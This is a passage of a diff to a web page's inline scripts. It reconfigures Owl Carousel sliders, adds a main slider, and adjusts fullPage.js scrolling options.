+    	$('.secondary-slider').owlCarousel({
     loop:true,
     nav:false,
-	autoplay:true,
+    autoplay:true,
     responsive:{
         0:{
             items:1
@@ -888,10 +660,25 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
             items:1
         }
     }
-})
-	
-</script>
+});
 
+$('.main-slider').owlCarousel({
+    loop:true,
+    nav:false,
+    autoplay:true,
+    responsive:{
+        0:{
+            items:1
+        },
+        600:{
+            items:1
+        },
+        1000:{
+            items:1
+        }
+    }
+});
+</script>
 
 
 <script>window.twttr = (function (d, s, id) {
@@ -906,19 +693,16 @@ Our expertise is supported by large manufacturing facility and a PAN India distr
 
 
 <script>
-
 $("#fullpage").fullpage({
-        anchors: ["Home", "About", "Connectivity", "Amenities", "Floorplans", "Siteplan", "Specification", "Footer"],
-        lockAnchors: false,
 		navigation: false,
-        navigation: !0,
         sectionSelector: ".vertical-scrolling",
-        navigationTooltips: ["First page", "Second page", "Third and last page"],
-        responsiveWidth: 900,
-        afterResponsive: function(o) {},
-        scrollingSpeed: 700,
-     
+        responsiveWidth: 992,
+        scrollingSpeed: 500,
+		fitToSection: true,
+		css3: true,
+		keyboardScrolling: true,
     })
+
 </script>
 
 </body>
